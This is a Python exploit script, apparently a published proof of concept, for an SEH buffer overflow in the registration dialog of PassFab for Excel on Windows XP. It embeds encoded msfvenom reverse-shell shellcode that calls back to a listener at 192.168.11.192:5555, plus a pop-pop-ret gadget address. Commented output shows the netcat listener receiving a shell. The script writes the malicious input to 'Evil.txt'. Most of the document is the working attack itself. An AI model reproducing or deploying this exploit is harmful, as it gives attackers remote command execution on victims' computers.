#!/usr/bin/python
#TESTED ON WINDOW XP PROFESSIONAL XP 3
#COPY THE CONTENT TO |UNREGISTED AND PASTE TO LICENSED EMAIL AND REGISTRATION CODE AND CLICK REGISTER WILL CAUSE CRASH AND OVERWRITE SEH|


#root@kali:~# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.192] from (UNKNOWN) [192.168.11.177] 1294
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Program Files\PassFab for Excel>


#root@kali:~# /usr/bin/msf-pattern_offset -q 41386941
#[*] Exact match at offset 264

#Findjmp, Eeye, I2S-LaB
#Findjmp2, Hat-Squad
#Scanning SoftwareLog.dll for code useable with the esi register
#0x100519E9      pop esi - pop - ret
#0x10051A64      pop esi - pop - ret
#0x10051A94      pop esi - pop - ret
#0x10051BAD      pop esi - pop - retbis
#0x10053775      pop esi - pop - retbis
#0x1005BE15      pop esi - pop - ret
#0x10067431      pop esi - pop - ret
#0x100674AA      pop esi - pop - ret


#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.192 lport=5555 -f python -e x86/alpha_mixed
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 709 (iteration=0)
#x86/alpha_mixed chosen with final size 709
#Payload size: 709 bytes
#Final size of python file: 3396 bytes
buf =  ""
buf += "\x89\xe3\xd9\xcb\xd9\x73\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
buf += "\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
buf += "\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x38\x68\x4c\x42"
buf += "\x75\x50\x63\x30\x45\x50\x33\x50\x4b\x39\x6a\x45\x30"
buf += "\x31\x49\x50\x65\x34\x4e\x6b\x66\x30\x36\x50\x4e\x6b"
buf += "\x73\x62\x76\x6c\x6e\x6b\x70\x52\x75\x44\x4e\x6b\x33"
buf += "\x42\x67\x58\x46\x6f\x6c\x77\x63\x7a\x57\x56\x46\x51"
buf += "\x69\x6f\x4e\x4c\x57\x4c\x70\x61\x73\x4c\x77\x72\x54"
buf += "\x6c\x37\x50\x59\x51\x48\x4f\x54\x4d\x37\x71\x4f\x37"
buf += "\x6b\x52\x4b\x42\x71\x42\x50\x57\x6c\x4b\x46\x32\x76"
buf += "\x70\x4c\x4b\x32\x6a\x55\x6c\x4c\x4b\x32\x6c\x54\x51"
buf += "\x44\x38\x78\x63\x73\x78\x67\x71\x78\x51\x72\x71\x4c"
buf += "\x4b\x30\x59\x45\x70\x76\x61\x68\x53\x6e\x6b\x63\x79"
buf += "\x55\x48\x78\x63\x37\x4a\x57\x39\x6e\x6b\x55\x64\x4c"
buf += "\x4b\x53\x31\x39\x46\x74\x71\x39\x6f\x4c\x6c\x6f\x31"
buf += "\x58\x4f\x44\x4d\x66\x61\x5a\x67\x45\x68\x69\x70\x43"
buf += "\x45\x78\x76\x64\x43\x51\x6d\x79\x68\x57\x4b\x71\x6d"
buf += "\x47\x54\x53\x45\x5a\x44\x66\x38\x6c\x4b\x63\x68\x54"
buf += "\x64\x36\x61\x38\x53\x61\x76\x6e\x6b\x34\x4c\x62\x6b"
buf += "\x6c\x4b\x70\x58\x77\x6c\x55\x51\x58\x53\x6e\x6b\x65"
buf += "\x54\x4e\x6b\x66\x61\x6a\x70\x6d\x59\x52\x64\x74\x64"
buf += "\x61\x34\x33\x6b\x31\x4b\x31\x71\x71\x49\x51\x4a\x43"
buf += "\x61\x59\x6f\x4b\x50\x71\x4f\x31\x4f\x72\x7a\x4c\x4b"
buf += "\x32\x32\x48\x6b\x4c\x4d\x51\x4d\x71\x78\x35\x63\x75"
buf += "\x62\x35\x50\x75\x50\x75\x38\x74\x37\x43\x43\x77\x42"
buf += "\x61\x4f\x56\x34\x30\x68\x50\x4c\x73\x47\x65\x76\x43"
buf += "\x37\x79\x6f\x38\x55\x48\x38\x7a\x30\x77\x71\x35\x50"
buf += "\x37\x70\x51\x39\x6a\x64\x46\x34\x72\x70\x42\x48\x77"
buf += "\x59\x4b\x30\x72\x4b\x63\x30\x79\x6f\x59\x45\x42\x70"
buf += "\x56\x30\x32\x70\x66\x30\x73\x70\x62\x70\x67\x30\x50"
buf += "\x50\x51\x78\x38\x6a\x44\x4f\x39\x4f\x49\x70\x39\x6f"
buf += "\x39\x45\x6d\x47\x53\x5a\x74\x45\x61\x78\x4f\x30\x4c"
buf += "\x68\x66\x6b\x4b\x70\x51\x78\x67\x72\x65\x50\x42\x35"
buf += "\x48\x33\x6c\x49\x68\x66\x73\x5a\x52\x30\x62\x76\x52"
buf += "\x77\x35\x38\x4a\x39\x6c\x65\x44\x34\x31\x71\x4b\x4f"
buf += "\x39\x45\x4f\x75\x49\x50\x42\x54\x56\x6c\x49\x6f\x50"
buf += "\x4e\x47\x78\x43\x45\x4a\x4c\x70\x68\x58\x70\x4d\x65"
buf += "\x49\x32\x50\x56\x79\x6f\x39\x45\x35\x38\x35\x33\x70"
buf += "\x6d\x75\x34\x37\x70\x4c\x49\x4a\x43\x43\x67\x72\x77"
buf += "\x63\x67\x30\x31\x38\x76\x33\x5a\x46\x72\x73\x69\x46"
buf += "\x36\x49\x72\x79\x6d\x55\x36\x5a\x67\x61\x54\x51\x34"
buf += "\x37\x4c\x33\x31\x46\x61\x6e\x6d\x32\x64\x45\x74\x36"
buf += "\x70\x4f\x36\x67\x70\x30\x44\x72\x74\x56\x30\x62\x76"
buf += "\x43\x66\x51\x46\x51\x56\x33\x66\x42\x6e\x36\x36\x76"
buf += "\x36\x31\x43\x43\x66\x71\x78\x63\x49\x78\x4c\x67\x4f"
buf += "\x4f\x76\x69\x6f\x4a\x75\x4c\x49\x39\x70\x62\x6e\x62"
buf += "\x76\x31\x56\x79\x6f\x54\x70\x71\x78\x55\x58\x4d\x57"
buf += "\x65\x4d\x53\x50\x4b\x4f\x5a\x75\x6d\x6b\x58\x70\x4c"
buf += "\x75\x6d\x72\x42\x76\x72\x48\x79\x36\x7a\x35\x4d\x6d"
buf += "\x6f\x6d\x79\x6f\x6e\x35\x35\x6c\x54\x46\x71\x6c\x67"
buf += "\x7a\x4b\x30\x59\x6b\x4b\x50\x50\x75\x43\x35\x4f\x4b"
buf += "\x43\x77\x55\x43\x32\x52\x42\x4f\x52\x4a\x63\x30\x76"
buf += "\x33\x39\x6f\x4e\x35\x41\x41"


buffer = "A"*260 + "\xEB\x06\x90\x90" + "\xE9\x19\x05\x10" + buf +"d"*6000
try:
	f=open("Evil.txt","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e

